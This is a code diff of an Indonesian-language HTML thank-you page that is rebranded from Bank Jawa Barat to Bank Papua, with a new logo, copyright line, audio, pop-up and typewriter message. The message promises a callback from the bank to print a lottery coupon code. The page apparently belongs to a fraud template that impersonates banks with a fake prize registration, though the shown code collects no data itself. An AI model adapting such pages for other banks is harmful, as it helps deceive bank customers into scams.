@@ -41,7 +41,7 @@
     }
 
     .header img {
-      max-width: 100%;
+      max-width: 120%;
       margin-bottom: 15px;
     }
 
@@ -86,14 +86,23 @@
     .swal2-border-radius {
       border-radius: 12px !important;
     }
+
+    .swal2-image-custom {
+      margin-bottom: -10px; /* Naikkan gambar agar lebih rapi */
+    }
+    .swal2-text-custom {
+  width: 20px;
+      /* Naikkan teks agar lebih rapi */
+    }
+    
   </style>
 </head>
 <body onload="initPage()">
   <div class="container">
     <div class="header">
-      <img src="bankbjb.png" alt="Logo" style="height: 60px" />
+      <img src="bank.png" alt="Logo" style="height: 120px ;" />
     </div>
-    <img src="regis.jpeg" alt="Ilustrasi Pelanggan" class="img-fluid" />
+    <img src="formakhirr.png" alt="Ilustrasi Pelanggan" class="img-fluid" />
 
     <!-- Kotak pesan dengan efek ketik (typewriter) -->
     <div class="message">
@@ -101,57 +110,41 @@
     </div>
 
     <div class="footer">
-      &copy; 2025 PT Bank JawaBarat (Persero) Tbk.
+      &copy; 2025 Bank Papua
     </div>
   </div>
 
-  <audio id="thankYouAudio" src="brii.mp3"></audio>
-
+  <audio id="thankYouAudio" src="suara.mp3"></audio>
   <script>
     // Teks yang akan ditampilkan dengan efek ketik
-    const typewriterText = `Terimakasih Telah Mendaftar Dilayanan Bank Jawa Barat Festival.
-Pendaftaran Anda Sedang Diproses.
-Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank Jabar
-Untuk Proses Cetak Kode Kupon Undian Anda.`;
-
-    // Fungsi untuk memutar audio dengan jeda 1 detik
+    const typewriterText = `Terimakasih Telah Mendaftar di Layanan Bank Papua.
+  Pendaftaran Anda Sedang Diproses.
+  Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank Papua
+  Untuk Proses Cetak Kode Kupon Undian Anda.`;
+  
+    // Fungsi untuk memutar audio setelah tombol OK ditekan
     function playAudio() {
       const audio = document.getElementById("thankYouAudio");
-      setTimeout(() => {
-        const playPromise = audio.play();
-        if (playPromise !== undefined) {
-          playPromise.catch((error) => {
-            document.body.addEventListener(
-              "click",
-              () => {
-                audio.play();
-              },
-              { once: true }
-            );
-          });
-        }
-      }, 1000);
+      const playPromise = audio.play();
+      if (playPromise !== undefined) {
+        playPromise.catch((error) => {
+          document.body.addEventListener(
+            "click",
+            () => {
+              audio.play();
+            },
+            { once: true }
+          );
+        });
+      }
     }
-
-    // SweetAlert2 pop-up
-    function showThankYouAlert() {
-      Swal.fire({
-        title: "Pendaftaran Berhasil!",
-        text: "Terima kasih telah mendaftar. Mohon tunggu konfirmasi lebih lanjut.",
-        icon: "success",
-        confirmButtonText: "OK",
-        confirmButtonColor: "#004080",
-        customClass: {
-          popup: "swal2-border-radius",
-        },
-      });
-    }
-
+  
     // Efek ketik satu per satu huruf
     function typeWriterEffect(text, containerId, speed = 40) {
       let index = 0;
       const container = document.getElementById(containerId);
-
+      container.innerHTML = ""; // Reset teks
+  
       function typeChar() {
         if (index < text.length) {
           container.innerHTML += text.charAt(index);
@@ -161,13 +154,34 @@ Untuk Proses Cetak Kode Kupon Undian Anda.`;
       }
       typeChar();
     }
-
+  
+    // SweetAlert2 pop-up dengan gambar tester.jpg dan modal yang lebih kecil
+    function showThankYouAlert() {
+      Swal.fire({
+        width: '320px',
+        imageUrl: "tester.jpg",
+        text: "Lanjut proses Penyelesaian.",
+        imageAlt: "Bank Papua",
+        confirmButtonText: "OK",
+        confirmButtonColor: "#004080",
+        customClass: {
+          text: "swal2-text-custom",
+          popup: "swal2-border-radius",
+          image: "swal2-image-custom",
+        },
+      }).then((result) => {
+        if (result.isConfirmed) {
+          playAudio(); // Jalankan suara setelah tombol OK ditekan
+          typeWriterEffect(typewriterText, "typingContainer", 40); // Jalankan efek ketik
+        }
+      });
+    }
+  
     // Fungsi inisialisasi saat halaman di-load
     function initPage() {
-      playAudio();
-      showThankYouAlert();
-      typeWriterEffect(typewriterText, "typingContainer", 40); // kecepatan 40 ms per huruf
+      showThankYouAlert(); // Tampilkan popup dulu, baru jalankan efek setelah OK
     }
   </script>
+  
 </body>
 </html>
